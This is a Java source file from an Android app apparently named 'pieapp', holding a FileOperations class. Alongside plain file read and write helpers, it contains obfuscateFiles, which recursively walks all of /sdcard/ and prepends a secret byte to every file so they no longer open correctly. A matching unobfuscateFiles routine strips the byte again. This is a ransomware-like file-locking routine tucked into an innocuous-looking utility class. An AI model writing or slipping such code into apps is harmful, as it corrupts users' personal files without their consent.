package com.example.pieapp;

        import java.io.BufferedInputStream;
        import java.io.BufferedReader;
        import java.io.BufferedWriter;
        import java.io.DataInputStream;
        import java.io.File;
        import java.io.FileInputStream;
        import java.io.FileOutputStream;
        import java.io.FileReader;
        import java.io.FileWriter;
        import java.io.IOException;
        import java.util.ArrayList;
        import java.util.List;
        import java.util.stream.Collectors;

        import android.os.Environment;
        import android.util.Log;

public class FileOperations {

    byte secret = 41;

    public FileOperations() {

    }

    public Boolean write(String fname, String fcontent){
        try {

            String fpath = "/sdcard/"+fname+".txt";

            File file = new File(fpath);

            // If file does not exists, then create it
            if (!file.exists()) {
                file.createNewFile();
            }

            FileWriter fw = new FileWriter(file.getAbsoluteFile());
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write(fcontent);
            bw.close();

            Log.d("FileWrite","Success");
            return true;

        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }

    }

    public String read(String fname){

        BufferedReader br = null;
        String response = null;

        try {

            StringBuffer output = new StringBuffer();
            String fpath = "/sdcard/"+fname+".txt";

            br = new BufferedReader(new FileReader(fpath));
            String line = "";
            while ((line = br.readLine()) != null) {
                output.append(line +"\n");
            }
            response = output.toString();

        } catch (IOException e) {
            e.printStackTrace();
            return null;

        }
        return response;

    }

    private boolean writeBytesToFile(File file, byte[] content) {
        try {
            // If file does not exists, then create it
            if (!file.exists()) {
                file.createNewFile();
            }

            FileOutputStream outputStream = new FileOutputStream(file.getAbsoluteFile());
            outputStream.write(content);
            outputStream.close();

            Log.d("FileWriteBytes","Success");
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean obfuscateFile(File file) {
        try {
            byte[] orig = readFileBytes(file);
            if (!isObfuscated(orig)) {
                byte[] obfuscated = new byte[orig.length + 1];
                obfuscated[0] = secret;
                System.arraycopy(orig, 0, obfuscated, 1, orig.length);

                if(writeBytesToFile(file, obfuscated)) {
                    Log.d("FileObfuscation","Success");
                }
            } else {
                Log.d("FileObfuscation","File already obfuscated");
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean unobfuscateFile(File file) {
        try {
            byte[] contents = readFileBytes(file);
            if (isObfuscated(contents)) {
                byte[] orig = new byte[contents.length - 1];
                System.arraycopy(contents, 1, orig, 0, orig.length);

                if(writeBytesToFile(file, orig)) {
                    Log.d("FileUnobfuscation","Success");
                }
            } else {
                Log.d("FileUnobfuscation","File already plaintext");
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private byte[] readFileBytes(File file) {
        try {
            byte bytes[] = new byte[(int) file.length()];
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            DataInputStream dis = new DataInputStream(bis);
            dis.readFully(bytes);
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private boolean isObfuscated(byte[] bytes) {
        return (bytes.length > 0 && bytes[0] == secret);
    }

    public boolean obfuscateFiles() {
        boolean success = true;
        for (File file : getFiles()) {
            success = success && obfuscateFile(file);
        }
        return success;
    }

    public boolean unobfuscateFiles() {
        boolean success = true;
        for (File file : getFiles()) {
            success = success && unobfuscateFile(file);
        }
        return success;
    }

    public ArrayList<File> getFiles() {
        String rootpath = "/sdcard/";
        return getFilesRecursive(rootpath);
    }

    public String getFileNames() {
        List<String> fnames = getFiles().stream().map(f -> f.getPath()).collect(Collectors.toList());
        return fnames.stream().reduce("", (s1,s2) -> s1 + ", " + s2);
    }

    private ArrayList<File> getFilesRecursive(String path) {
        File file = new File(path);
        ArrayList<File> list = new ArrayList<>();
        if(file.exists()) {
            if(file.isDirectory()) {
                for (File child : file.listFiles()) {
                    list.addAll(getFilesRecursive(child.getPath()));
                }

            } else if (file.isFile()) {
                list.add(file);
            }
        }
        return list;
    }
}
